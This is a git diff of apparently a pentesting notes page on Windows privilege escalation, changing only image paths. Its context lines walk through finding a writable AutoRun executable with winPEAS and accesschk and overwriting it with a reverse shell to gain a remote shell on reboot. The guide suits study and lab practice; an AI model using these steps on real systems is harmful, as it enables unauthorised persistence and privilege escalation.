@@ -8,7 +8,7 @@ Use winPEAS to check for writable AutoRun executables:
 winPEASany.exe quiet applicationsinfo
 ```
 
-![](../../../../../.gitbook/assets/image%20%28148%29.png)
+![](../../../../.gitbook/assets/image%20%28148%29.png)
 
 Alternatively, we could manually enumerate the AutoRun executables:
 
@@ -22,7 +22,7 @@ and then use accesschk.exe to verify the permissions on each one:
 accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
 ```
 
-![](../../../../../.gitbook/assets/image%20%28150%29.png)
+![](../../../../.gitbook/assets/image%20%28150%29.png)
 
 The “C:\Program Files\Autorun Program\program.exe” AutoRun executable is writable by Everyone. Create a backup of the original:
 
@@ -36,7 +36,7 @@ Copy our reverse shell executable to overwrite the AutoRun executable:
 copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\AutorunProgram\program.exe"
 ```
 
-![](../../../../../.gitbook/assets/image%20%28154%29.png)
+![](../../../../.gitbook/assets/image%20%28154%29.png)
 
 now start a listener on attacker machine and wait for the system to reboot, the autorun task will start and you will get a remote shell.
 
